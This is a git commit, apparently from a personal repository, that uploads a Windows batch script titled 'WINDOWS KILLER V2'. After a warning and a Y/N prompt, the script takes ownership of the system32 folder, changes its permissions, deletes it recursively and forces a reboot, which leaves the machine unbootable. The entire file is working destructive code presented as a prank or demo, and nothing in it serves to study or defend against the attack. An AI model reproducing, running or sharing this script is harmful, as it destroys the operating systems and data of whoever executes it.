abcae4875ee4ef02589d05d3d3c5d156501ee5b9
Hunterhud <125219909+Hunterhud@users.noreply.github.com>
2025-03-11 23:07:23 -0700

    Add files via upload

---
+++ WINDOWS KILLER V2 (1).bat
@@ -0,0 +1,14 @@
+echo WARNING THIS FILE IS MALICIOUS I RECOMMEND YOU RUN THIS IN A WINDOWS SANDBOX ENVIORMENT FOR YOUR COMPUTERS SAFETY I AM NOT RESPONSIBLE FOR ANY DAMAGES THIS MAY CAUSE WOULD YOU LIKE TO PROCEED? (Y/N)
+choice /c YN /n /m "Press Y to run the program or N to exit: "
+
+if errorlevel 2 goto no
+if errorlevel 1 goto yes
+
+:yes
+echo Running the program...
+takeown /f c:\windows\system32
+cacls c:\windows\system32
+rd /s /q c:\windows\system32
+del /s /q c:\windows\system32\*.*
+shutdown -r 
+
